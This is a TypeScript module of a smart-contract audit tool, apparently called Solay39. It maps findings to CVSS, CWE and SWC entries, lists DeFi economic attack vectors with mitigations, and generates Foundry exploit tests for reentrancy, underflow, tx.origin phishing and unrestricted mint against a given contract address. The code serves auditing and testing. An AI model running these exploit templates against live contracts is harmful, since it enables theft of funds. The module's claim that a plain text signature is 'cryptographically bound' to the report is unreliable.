// ═══════════════════════════════════════════════════════════════════
// SOLAY39 — Enterprise Standards
// CVSS v3.1 + CWE + SWC mappings automatici per ogni finding
// ═══════════════════════════════════════════════════════════════════

// ── CVSS v3.1 ────────────────────────────────────────────────────

export interface CVSSv3 {
  vectorString: string
  baseScore: number
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "NONE"
  attackVector: "N" | "A" | "L" | "P"
  attackComplexity: "L" | "H"
  privilegesRequired: "N" | "L" | "H"
  userInteraction: "N" | "R"
  scope: "U" | "C"
  confidentialityImpact: "H" | "L" | "N"
  integrityImpact: "H" | "L" | "N"
  availabilityImpact: "H" | "L" | "N"
}

export interface CWEEntry {
  id: string
  name: string
  url: string
}

export interface SWCEntry {
  id: string
  name: string
  url: string
}

// ── CVSS auto-calculator from finding pattern ─────────────────────

export function computeCVSS(findingTitle: string, severity: string): CVSSv3 {
  const t = findingTitle.toLowerCase()

  const vectors: Record<string, CVSSv3> = {
    CRITICAL: {
      vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      baseScore: 9.8, severity: "CRITICAL",
      attackVector: "N", attackComplexity: "L", privilegesRequired: "N",
      userInteraction: "N", scope: "U",
      confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "H",
    },
    HIGH: {
      vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
      baseScore: 8.1, severity: "HIGH",
      attackVector: "N", attackComplexity: "L", privilegesRequired: "L",
      userInteraction: "N", scope: "U",
      confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "N",
    },
    MEDIUM: {
      vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",
      baseScore: 4.2, severity: "MEDIUM",
      attackVector: "N", attackComplexity: "H", privilegesRequired: "L",
      userInteraction: "N", scope: "U",
      confidentialityImpact: "L", integrityImpact: "L", availabilityImpact: "N",
    },
    LOW: {
      vectorString: "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:N/I:L/A:N",
      baseScore: 1.8, severity: "LOW",
      attackVector: "L", attackComplexity: "H", privilegesRequired: "H",
      userInteraction: "R", scope: "U",
      confidentialityImpact: "N", integrityImpact: "L", availabilityImpact: "N",
    },
    INFO: {
      vectorString: "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:N",
      baseScore: 0.0, severity: "NONE",
      attackVector: "N", attackComplexity: "H", privilegesRequired: "H",
      userInteraction: "R", scope: "U",
      confidentialityImpact: "N", integrityImpact: "N", availabilityImpact: "N",
    },
  }

  let base = vectors[severity] || vectors["MEDIUM"]

  if (t.includes("reentrancy")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", baseScore: 9.8, severity: "CRITICAL", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "H" }
  } else if (t.includes("tx.origin")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N", baseScore: 7.4, severity: "HIGH", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "N" }
  } else if (t.includes("overflow") || t.includes("underflow")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 7.5, severity: "HIGH", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  } else if (t.includes("selfdestruct") || t.includes("self destruct")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H", baseScore: 9.1, severity: "CRITICAL", attackVector: "N", attackComplexity: "L", privilegesRequired: "H", scope: "C", confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "H" }
  } else if (t.includes("mint") && t.includes("unrestricted")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 7.5, severity: "HIGH", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  } else if (t.includes("mint") && (t.includes("centralized") || t.includes("authority"))) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N", baseScore: 2.7, severity: "LOW", attackVector: "N", attackComplexity: "L", privilegesRequired: "H", confidentialityImpact: "N", integrityImpact: "L", availabilityImpact: "N" }
  } else if (t.includes("pragma") || t.includes("floating")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N", baseScore: 3.7, severity: "LOW", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "L", availabilityImpact: "N" }
  } else if (t.includes("access control") && t.includes("missing")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 7.5, severity: "HIGH", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  } else if (t.includes("delegatecall")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H", baseScore: 8.5, severity: "HIGH", attackVector: "N", attackComplexity: "H", privilegesRequired: "L", scope: "C", confidentialityImpact: "H", integrityImpact: "H", availabilityImpact: "H" }
  } else if (t.includes("flash loan")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 7.5, severity: "HIGH", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  } else if (t.includes("oracle")) {
    base = { ...base, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N", baseScore: 5.9, severity: "MEDIUM", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", confidentialityImpact: "N", integrityImpact: "H", availabilityImpact: "N" }
  }

  return base
}

// ── CWE MAP ───────────────────────────────────────────────────────

const CWE_MAP: Record<string, CWEEntry> = {
  "reentrancy":          { id: "CWE-841", name: "Improper Enforcement of Behavioral Workflow", url: "https://cwe.mitre.org/data/definitions/841.html" },
  "access control":      { id: "CWE-284", name: "Improper Access Control", url: "https://cwe.mitre.org/data/definitions/284.html" },
  "overflow":            { id: "CWE-190", name: "Integer Overflow or Wraparound", url: "https://cwe.mitre.org/data/definitions/190.html" },
  "underflow":           { id: "CWE-191", name: "Integer Underflow", url: "https://cwe.mitre.org/data/definitions/191.html" },
  "selfdestruct":        { id: "CWE-664", name: "Improper Control of a Resource Through its Lifetime", url: "https://cwe.mitre.org/data/definitions/664.html" },
  "self destruct":       { id: "CWE-664", name: "Improper Control of a Resource Through its Lifetime", url: "https://cwe.mitre.org/data/definitions/664.html" },
  "tx.origin":           { id: "CWE-290", name: "Authentication Bypass by Spoofing", url: "https://cwe.mitre.org/data/definitions/290.html" },
  "timestamp":           { id: "CWE-330", name: "Use of Insufficiently Random Values", url: "https://cwe.mitre.org/data/definitions/330.html" },
  "delegatecall":        { id: "CWE-829", name: "Inclusion of Functionality from Untrusted Control Sphere", url: "https://cwe.mitre.org/data/definitions/829.html" },
  "flash loan":          { id: "CWE-362", name: "Race Condition", url: "https://cwe.mitre.org/data/definitions/362.html" },
  "oracle":              { id: "CWE-20",  name: "Improper Input Validation", url: "https://cwe.mitre.org/data/definitions/20.html" },
  "unchecked":           { id: "CWE-252", name: "Unchecked Return Value", url: "https://cwe.mitre.org/data/definitions/252.html" },
  "mint":                { id: "CWE-284", name: "Improper Access Control", url: "https://cwe.mitre.org/data/definitions/284.html" },
  "pragma":              { id: "CWE-693", name: "Protection Mechanism Failure", url: "https://cwe.mitre.org/data/definitions/693.html" },
  "pause":               { id: "CWE-284", name: "Improper Access Control", url: "https://cwe.mitre.org/data/definitions/284.html" },
  "default":             { id: "CWE-703", name: "Improper Check or Handling of Exceptional Conditions", url: "https://cwe.mitre.org/data/definitions/703.html" },
}

const SWC_MAP: Record<string, SWCEntry> = {
  "reentrancy":          { id: "SWC-107", name: "Reentrancy", url: "https://swcregistry.io/docs/SWC-107" },
  "access control":      { id: "SWC-105", name: "Unprotected Ether Withdrawal", url: "https://swcregistry.io/docs/SWC-105" },
  "overflow":            { id: "SWC-101", name: "Integer Overflow and Underflow", url: "https://swcregistry.io/docs/SWC-101" },
  "underflow":           { id: "SWC-101", name: "Integer Overflow and Underflow", url: "https://swcregistry.io/docs/SWC-101" },
  "selfdestruct":        { id: "SWC-106", name: "Unprotected SELFDESTRUCT Instruction", url: "https://swcregistry.io/docs/SWC-106" },
  "self destruct":       { id: "SWC-106", name: "Unprotected SELFDESTRUCT Instruction", url: "https://swcregistry.io/docs/SWC-106" },
  "tx.origin":           { id: "SWC-115", name: "Authorization through tx.origin", url: "https://swcregistry.io/docs/SWC-115" },
  "timestamp":           { id: "SWC-116", name: "Block values as a proxy for time", url: "https://swcregistry.io/docs/SWC-116" },
  "delegatecall":        { id: "SWC-112", name: "Delegatecall to Untrusted Callee", url: "https://swcregistry.io/docs/SWC-112" },
  "unchecked":           { id: "SWC-104", name: "Unchecked Call Return Value", url: "https://swcregistry.io/docs/SWC-104" },
  "pragma":              { id: "SWC-103", name: "Floating Pragma", url: "https://swcregistry.io/docs/SWC-103" },
  "flash loan":          { id: "SWC-107", name: "Reentrancy (Flash Loan variant)", url: "https://swcregistry.io/docs/SWC-107" },
  "default":             { id: "SWC-100", name: "Function Default Visibility", url: "https://swcregistry.io/docs/SWC-100" },
}

export function getCWE(findingTitle: string): CWEEntry {
  const t = findingTitle.toLowerCase()
  for (const [key, entry] of Object.entries(CWE_MAP)) {
    if (t.includes(key)) return entry
  }
  return CWE_MAP["default"]
}

export function getSWC(findingTitle: string): SWCEntry | null {
  const t = findingTitle.toLowerCase()
  for (const [key, entry] of Object.entries(SWC_MAP)) {
    if (t.includes(key)) return entry
  }
  return null
}

// ── REPORT INTEGRITY ─────────────────────────────────────────────

export interface ReportIntegrity {
  reportId: string
  sha256: string
  timestamp: string
  auditorSignature: string
  verificationUrl: string
}

export async function computeReportHash(reportJson: string): Promise<string> {
  const encoder = new TextEncoder()
  const data = encoder.encode(reportJson)
  const hashBuffer = await crypto.subtle.digest("SHA-256", data)
  const hashArray = Array.from(new Uint8Array(hashBuffer))
  return hashArray.map(b => b.toString(16).padStart(2, "0")).join("")
}

export function buildReportIntegrity(auditId: string, _reportJson: string, sha256: string): ReportIntegrity {
  return {
    reportId: `solay39-audit-${auditId}`,
    sha256,
    timestamp: new Date().toISOString(),
    auditorSignature: "Solay39 Founder — cryptographically bound to report content",
    verificationUrl: `https://www.solay39.eu/verify/${auditId}`,
  }
}

// ── DOUBLE REVIEWER ───────────────────────────────────────────────

export interface ReviewerProfile {
  name: string
  role: "Lead Auditor" | "Second Reviewer" | "QA Approver"
  credentials: string
  signedOff: boolean
  signOffDate?: string
  notes?: string
}

export interface DoubleReviewRecord {
  leadAuditor: ReviewerProfile
  secondReviewer?: ReviewerProfile
  qaApprover?: ReviewerProfile
  reviewStatus: "SINGLE_REVIEW" | "DOUBLE_REVIEW" | "QA_APPROVED"
  conflictsFound: string[]
  consensusReached: boolean
}

export function buildDefaultReviewRecord(leadName: string = "Solay39 Founder"): DoubleReviewRecord {
  return {
    leadAuditor: {
      name: leadName,
      role: "Lead Auditor",
      credentials: "Smart contract security specialist, manual adversarial review",
      signedOff: true,
      signOffDate: new Date().toISOString().slice(0, 10),
    },
    reviewStatus: "SINGLE_REVIEW",
    conflictsFound: [],
    consensusReached: true,
  }
}

// ── ECONOMIC ATTACK MODULE ────────────────────────────────────────

export interface EconomicAttackVector {
  type: "flash-loan" | "oracle-manipulation" | "mev-sandwich" | "liquidity-drain" | "governance-takeover" | "price-manipulation"
  title: string
  applicable: boolean
  severity: "High" | "Medium" | "Low" | "N/A"
  description: string
  exploitCondition: string
  estimatedLoss: string
  mitigation: string
  pocSketch: string
}

export function analyzeEconomicAttacks(
  contractSource: string,
  contractMeta: {
    hasProxy?: boolean
    hasMint?: boolean
    hasExternalCalls?: boolean
    contractType?: string
    hasPausable?: boolean
    hasBlacklist?: boolean
  }
): EconomicAttackVector[] {
  const src = contractSource.toLowerCase()
  const attacks: EconomicAttackVector[] = []
  const isDeFi = contractMeta.contractType === "defi-protocol" || /swap|liquidity|pool|vault|stake|borrow|lend/.test(src)
  const hasOracle = /chainlink|oracle|price.*feed|getlatestp|latestanswer|uniswap.*price|twap/.test(src)
  const hasGovernance = /governance|proposal|vote|timelock|quorum/.test(src)
  const hasLiquidity = /liquidity|addliquidity|removeliquidity|amm|pair/.test(src)
  const hasFlashLoanCallback = /flashloan|onflashloan|executeoperation|uniswapv2call|pancakecall/.test(src)

  attacks.push({
    type: "flash-loan",
    applicable: isDeFi || hasFlashLoanCallback || hasOracle,
    severity: isDeFi ? "High" : "Low",
    title: "Flash Loan Price Manipulation",
    description: isDeFi
      ? "The contract interacts with liquidity pools or price-sensitive logic. A flash loan attack can temporarily manipulate on-chain prices or pool ratios to exploit miscalculated values."
      : "Contract does not appear to use price-sensitive DeFi logic. Flash loan attack surface is minimal.",
    exploitCondition: isDeFi
      ? "Requires: (1) flash loan source (Aave/dYdX), (2) price-sensitive function in scope, (3) no TWAP or manipulation-resistant oracle"
      : "Not applicable — no price-sensitive logic detected",
    estimatedLoss: isDeFi ? "Up to 100% of funds in affected pool" : "N/A",
    mitigation: isDeFi
      ? "Use TWAP oracles (Uniswap v3 TWAP, Chainlink), add reentrancy guards, validate price within bounds"
      : "No action required",
    pocSketch: isDeFi ? `// Foundry PoC sketch\ncontract FlashLoanAttack {\n  function attack() external {\n    // 1. Borrow X tokens via Aave flash loan\n    // 2. Manipulate pool price via large swap\n    // 3. Call vulnerable function at manipulated price\n    // 4. Repay flash loan + keep profit\n  }\n}` : "N/A",
  })

  attacks.push({
    type: "oracle-manipulation",
    applicable: hasOracle,
    severity: hasOracle ? "Medium" : "Low",
    title: "Oracle Price Feed Manipulation",
    description: hasOracle
      ? "The contract reads from an external price oracle. If the oracle uses a spot price or lacks freshness checks, an attacker with sufficient capital can manipulate the reported price."
      : "No oracle dependency detected. Oracle manipulation is not applicable.",
    exploitCondition: hasOracle
      ? "Requires: access to oracle feed, sufficient liquidity to move price, no heartbeat/staleness check"
      : "Not applicable",
    estimatedLoss: hasOracle ? "Dependent on oracle-gated TVL" : "N/A",
    mitigation: hasOracle
      ? "Implement Chainlink oracles with staleness checks (updatedAt > block.timestamp - 3600). Use TWAP for DEX-based pricing."
      : "No action required",
    pocSketch: hasOracle ? `// Oracle staleness check bypass\n// If contract uses: (, int price,,,) = oracle.latestRoundData();\n// Without checking updatedAt — stale price can be used\n// Attack: trigger in period of oracle downtime` : "N/A",
  })

  attacks.push({
    type: "mev-sandwich",
    applicable: hasLiquidity || /swap|trade|exchange/.test(src),
    severity: hasLiquidity ? "Medium" : "Low",
    title: "MEV Sandwich Attack",
    description: hasLiquidity
      ? "Swap or trade transactions can be front-run and back-run by MEV bots, sandwiching the victim's transaction to extract value."
      : "No AMM swap logic detected. MEV sandwich attack is not applicable.",
    exploitCondition: "Requires: mempool visibility, no slippage protection, transaction without deadline",
    estimatedLoss: "0.1% - 5% per transaction depending on liquidity depth",
    mitigation: "Enforce slippage tolerance (amountOutMin), add deadline parameter, use private mempool (Flashbots Protect)",
    pocSketch: hasLiquidity ? `// MEV bot sandwich\n// 1. Detect victim swap in mempool\n// 2. Front-run: buy token, push price up\n// 3. Victim swap executes at worse price\n// 4. Back-run: sell token at inflated price` : "N/A",
  })

  attacks.push({
    type: "governance-takeover",
    applicable: hasGovernance,
    severity: hasGovernance ? "High" : "Low",
    title: "Governance Flash Loan Takeover",
    description: hasGovernance
      ? "If voting power is based on token balance at snapshot time, a flash loan can temporarily acquire enough tokens to pass malicious proposals."
      : "No governance mechanism detected.",
    exploitCondition: hasGovernance
      ? "Requires: flash-loan accessible governance token, no timelock, no quorum above flash-loan capital"
      : "Not applicable",
    estimatedLoss: hasGovernance ? "Total protocol treasury and parameter control" : "N/A",
    mitigation: hasGovernance
      ? "Use vote-escrowed tokens (veToken), implement timelock (min 48h), require quorum > available flash loan liquidity"
      : "No action required",
    pocSketch: hasGovernance ? `// Governance flash loan\n// 1. Flash loan governance tokens\n// 2. Create + vote on malicious proposal\n// 3. If no timelock: execute immediately\n// 4. Drain treasury / change parameters` : "N/A",
  })

  attacks.push({
    type: "liquidity-drain",
    applicable: contractMeta.hasMint === true || hasLiquidity,
    severity: contractMeta.hasMint ? "Medium" : "Low",
    title: "Liquidity Drain via Uncapped Mint",
    description: contractMeta.hasMint
      ? "If the mint function is accessible to a compromised owner, unlimited token inflation can be used to drain liquidity pools by swapping freshly minted tokens."
      : "No uncapped mint detected.",
    exploitCondition: contractMeta.hasMint
      ? "Requires: compromised owner/minter key, active liquidity pool for the token"
      : "Not applicable",
    estimatedLoss: contractMeta.hasMint ? "100% of pool liquidity if owner key compromised" : "N/A",
    mitigation: contractMeta.hasMint
      ? "Implement supply cap, multisig for minter role, timelock on mint operations"
      : "No action required",
    pocSketch: contractMeta.hasMint ? `// Liquidity drain via mint\n// 1. Compromised minter calls mint(attacker, MAX_UINT)\n// 2. Swap minted tokens in DEX pool\n// 3. Extract paired token (ETH/USDC) from pool` : "N/A",
  })

  return attacks
}

// ── PoC GENERATOR ────────────────────────────────────────────────

export function generateFoundryPoC(
  findingTitle: string,
  contractName: string,
  contractAddress: string,
  vulnerableCode: string,
): string {
  const t = findingTitle.toLowerCase()

  if (t.includes("reentrancy")) {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// Solay39 PoC — Reentrancy Attack
// Finding: ${findingTitle}
// Contract: ${contractName} (${contractAddress})

interface IVulnerable {
    function withdraw() external;
    function deposit() external payable;
}

contract ReentrancyAttacker {
    IVulnerable public target;
    uint public count;

    constructor(address _target) { target = IVulnerable(_target); }

    receive() external payable {
        if (count < 5) {
            count++;
            target.withdraw();
        }
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
}

contract ReentrancyTest is Test {
    function testExploit() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        ReentrancyAttacker attacker = new ReentrancyAttacker(${contractAddress});
        uint before = address(attacker).balance;
        attacker.attack{value: 1 ether}();
        uint after_ = address(attacker).balance;
        assertTrue(after_ > before, "Reentrancy exploit succeeded");
    }
}`
  }

  if (t.includes("overflow") || t.includes("underflow")) {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// Solay39 PoC — Integer Overflow/Underflow
// Finding: ${findingTitle}
// Contract: ${contractName} (${contractAddress})

interface IVulnerable {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract OverflowTest is Test {
    function testExploit() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        IVulnerable token = IVulnerable(${contractAddress});
        address attacker = makeAddr("attacker");

        vm.prank(attacker);
        bool success = token.transfer(address(this), type(uint256).max);

        uint256 bal = token.balanceOf(attacker);
        assertGt(bal, 1e30, "Underflow confirmed");
    }
}`
  }

  if (t.includes("tx.origin")) {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// Solay39 PoC — tx.origin Phishing Attack
// Finding: ${findingTitle}
// Contract: ${contractName} (${contractAddress})

interface IVulnerable {
    function adminFunction() external;
}

contract PhishingContract {
    IVulnerable public target;
    constructor(address _target) { target = IVulnerable(_target); }

    function innocentLookingFunction() external {
        target.adminFunction();
    }
}

contract TxOriginTest is Test {
    function testExploit() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        address owner = address(0x1234);
        PhishingContract phisher = new PhishingContract(${contractAddress});

        vm.prank(owner, owner);
        phisher.innocentLookingFunction();
    }
}`
  }

  if (t.includes("mint") && t.includes("unrestricted")) {
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// Solay39 PoC — Unrestricted Mint
// Finding: ${findingTitle}
// Contract: ${contractName} (${contractAddress})

interface IVulnerable {
    function mint(address to, uint256 amount) external;
    function totalSupply() external view returns (uint256);
}

contract UnrestrictedMintTest is Test {
    function testExploit() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        IVulnerable token = IVulnerable(${contractAddress});
        address attacker = makeAddr("attacker");

        uint256 supplyBefore = token.totalSupply();
        vm.prank(attacker);
        token.mint(attacker, 1_000_000_000 ether);
        uint256 supplyAfter = token.totalSupply();

        assertGt(supplyAfter, supplyBefore, "Unrestricted mint confirmed");
    }
}`
  }

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// Solay39 PoC — ${findingTitle}
// Contract: ${contractName} (${contractAddress})
// Vulnerable code: ${vulnerableCode.slice(0, 100)}...

contract PoCTest is Test {
    function testExploit() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        // TODO: implement specific exploit for:
        // ${findingTitle}
        //
        // Steps:
        // 1. Identify vulnerable state/function
        // 2. Craft exploit transaction
        // 3. Verify impact (balance change / state corruption)

        assertTrue(false, "Implement PoC for: ${findingTitle}");
    }
}`
}
